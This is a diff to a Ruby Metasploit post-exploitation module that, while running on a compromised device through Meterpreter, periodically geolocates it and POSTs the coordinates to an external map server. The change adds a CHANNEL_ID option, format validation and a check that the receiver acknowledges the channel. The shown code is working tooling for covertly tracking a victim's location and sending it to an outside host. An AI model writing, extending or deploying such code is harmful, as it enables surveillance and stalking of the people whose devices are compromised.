@@ -25,6 +25,7 @@ class MetasploitModule < Msf::Post
       OptString.new('MAP_USER', [false, 'HTTP Basic username for the map server', '']),
       OptString.new('MAP_PASSWORD', [false, 'HTTP Basic password for the map server', '']),
       OptString.new('TRACK_ID', [false, 'Recording-run ID (generated for each job if omitted)', '']),
+      OptString.new('CHANNEL_ID', [false, 'Stable operator-configured Cartochron acquisition channel', '']),
       OptString.new('SOURCE_ID', [false, 'Operator-enrolled Cartochron source ID (not a device fingerprint)', ''])
     ])
   end
@@ -41,6 +42,7 @@ class MetasploitModule < Msf::Post
     map_password = datastore['MAP_PASSWORD'].to_s
     track_id = datastore['TRACK_ID'].to_s
     source_id = datastore['SOURCE_ID'].to_s
+    channel_id = datastore['CHANNEL_ID'].to_s
     track_id = SecureRandom.uuid if track_id.empty?
     uri = URI.parse(endpoint)
     unless uri.is_a?(URI::HTTP) && uri.host && !uri.userinfo
@@ -57,6 +59,11 @@ class MetasploitModule < Msf::Post
       return
     end
 
+    unless channel_id.empty? || /\A[A-Za-z0-9][A-Za-z0-9._-]{0,63}\z/.match?(channel_id)
+      print_error('CHANNEL_ID must be 1-64 ASCII letters, digits, dots, underscores or hyphens')
+      return
+    end
+
     unless source_id.empty? || /\Asrc_[0-9a-f]{24}\z/.match?(source_id)
       print_error('SOURCE_ID must be an enrolled Cartochron src_ identifier')
       return
@@ -65,7 +72,7 @@ class MetasploitModule < Msf::Post
     counts = { accepted: 0, rejected: 0, unavailable: 0, errors: 0 }
     previous = nil
     last_report = Process.clock_gettime(Process::CLOCK_MONOTONIC)
-    ilog("[Cartochron] Started run=#{track_id} source=#{source_id.empty? ? 'unassigned' : source_id} destination=#{uri.scheme}://#{uri.host}:#{uri.port} interval=#{interval}s")
+    ilog("[Cartochron] Started run=#{track_id} source=#{source_id.empty? ? 'unassigned' : source_id} channel=#{channel_id.empty? ? 'unassigned' : channel_id} destination=#{uri.scheme}://#{uri.host}:#{uri.port} interval=#{interval}s")
     ilog('[Cartochron] Meterpreter geolocate uses last-known network location; fix age and accuracy unavailable')
 
     loop do
@@ -85,8 +92,16 @@ class MetasploitModule < Msf::Post
 
           if lat && lon && lat.to_f != 0.0 && lon.to_f != 0.0
             response = submit_position(uri, lat.to_f, lon.to_f, map_user, map_password,
-                                       track_id, source_id.empty? ? nil : source_id)
+                                       track_id, source_id.empty? ? nil : source_id,
+                                       channel_id.empty? ? nil : channel_id)
             if response.is_a?(Net::HTTPSuccess)
+              unless channel_id.empty? || channel_acknowledged?(response, channel_id)
+                # The observation may already have been stored by an older receiver.
+                # Stop rather than keep recording without the required provenance.
+                counts[:rejected] += 1
+                wlog("[Cartochron] Receiver did not acknowledge CHANNEL_ID run=#{track_id}; upgrade the receiver")
+                return
+              end
               outcome = :accepted
               dlog("[Cartochron] Observation accepted run=#{track_id}", 'core', 2)
             else
@@ -137,7 +152,16 @@ class MetasploitModule < Msf::Post
       "unavailable=#{counts[:unavailable]} errors=#{counts[:errors]}"
   end
 
-  def submit_position(uri, lat, lon, username, password, track_id = nil, source_id = nil)
+  def channel_acknowledged?(response, channel_id)
+    return false unless response.code == '201'
+
+    body = JSON.parse(response.body.to_s)
+    body.is_a?(Hash) && body['channel_id'] == channel_id
+  rescue JSON::ParserError
+    false
+  end
+
+  def submit_position(uri, lat, lon, username, password, track_id = nil, source_id = nil, channel_id = nil)
     http = Net::HTTP.new(uri.host, uri.port)
     http.use_ssl = uri.scheme == 'https'
     http.open_timeout = 5
@@ -148,6 +172,7 @@ class MetasploitModule < Msf::Post
     observation = { lat: lat, lon: lon }
     observation[:track_id] = track_id if track_id
     observation[:source_id] = source_id if source_id
+    observation[:channel_id] = channel_id if channel_id
     request.body = observation.to_json
     http.request(request)
   end
